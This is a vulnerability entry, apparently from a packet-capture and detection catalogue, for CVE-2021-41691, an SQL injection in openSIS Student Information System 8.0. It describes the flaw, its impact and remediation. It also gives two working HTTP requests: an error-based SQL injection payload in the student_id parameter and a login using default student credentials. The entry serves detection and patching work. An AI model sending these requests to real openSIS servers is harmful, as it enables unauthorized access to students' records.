---
layout: post
cve_id: CVE-2021-41691
title: openSIS Student Information System 8.0 SQL Injection
pcap: true
pcap_path: /pcaps/2021/CVE-2021-41691.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-41691.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Bartu Utku SARP
severity: high
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary SQL queries, potentially leading to unauthorized access, data
  manipulation, or data leakage.

  '
remediation: 'Apply the latest security patch or upgrade to a patched version of openSIS
  Student Information System to mitigate the SQL Injection vulnerability (CVE-2021-41691).

  '
reference:
- https://securityforeveryone.com/blog/opensis-student-information-system-0-day-vulnerability-cve-2021-41691
- https://www.exploit-db.com/exploits/50637
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4169
classification:
  cve-id: CVE-2021-41691
  epss-score: 0.02472
  epss-percentile: 0.8485
metadata:
  max-request: 2
tags:
- cve
- cve2021
- sqli
- auth
- edb
- opensis
- vkev
- vuln
---

## üîç Vulnerability Description
openSIS Student Information System version 8.0 is susceptible to SQL injection via the student_id and TRANSFER[SCHOOL] parameters in POST request sent to /TransferredOutModal.php.

## üåê HTTP Request
```nohighlight
POST /TransferredOutModal.php?modfunc=detail HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Content-Length: 103
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip
Connection: close
student_id=updatexml(0x23,concat(1,md5(2529)),1)&button=Save&TRANSFER[SCHOOL]=5&TRANSFER[Grade_Level]=5
```

```nohighlight
POST /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip
Connection: close
USERNAME=student&PASSWORD=student@123&language=en&log=
```

